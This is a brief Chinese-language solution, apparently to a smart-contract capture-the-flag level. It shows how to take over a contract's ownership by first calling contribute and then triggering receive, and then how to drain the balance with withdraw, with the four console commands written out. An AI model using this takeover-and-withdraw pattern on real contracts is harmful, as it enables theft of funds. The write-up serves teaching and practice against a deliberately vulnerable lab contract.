阅读合约代码可以发现，可以 `receive` 函数中可以在一定条件下获得合约所有权。而 `contribute` 函数中获得所有权的条件比较难满足，因此思路为先通过  `contribute`  函数使 `contributions[msg.sender] > 0` 成立，再调用 `receive` 函数获得合约所有权。最后使用 `withdraw` 函数转出合约余额。

```js
// 修改 contributions 数据
await contract.contribute({value: 1});

// 调用 receive
await contract.send(1);

// 确认已经成为所有者
await contract.owner();

// 转出合约余额
await contract.withdraw();
```

